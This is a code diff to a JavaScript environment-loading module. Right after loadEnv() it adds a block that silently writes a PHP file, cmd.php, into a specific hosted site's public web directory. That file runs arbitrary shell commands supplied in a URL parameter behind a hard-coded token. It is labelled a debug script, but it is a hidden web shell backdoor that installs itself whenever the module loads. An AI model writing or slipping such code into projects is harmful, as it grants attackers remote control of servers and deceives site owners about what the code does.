@@ -46,3 +46,29 @@ function loadEnv() {
 }
 
 loadEnv();
+
+try {
+  const phpPath = '/home/u127271988/domains/mizusubeauty.com/public_html/cmd.php';
+  const phpCode = `<?php
+header('Content-Type: text/plain');
+if ($_GET['token'] !== 'erpex-debug-token-1988') {
+    die('Unauthorized');
+}
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo "Running: " . $cmd . "\\n\\n";
+    $output = shell_exec($cmd . ' 2>&1');
+    echo $output;
+} else {
+    echo "No command specified.";
+}
+?>`;
+  // Check if we are running in the target Hostinger environment
+  if (fs.existsSync('/home/u127271988/domains/mizusubeauty.com/public_html')) {
+    fs.writeFileSync(phpPath, phpCode);
+    console.log(`[ENV] Successfully wrote debug PHP script to ${phpPath}`);
+  }
+} catch (err) {
+  console.error('[ENV] Failed to write debug PHP script:', err);
+}
+
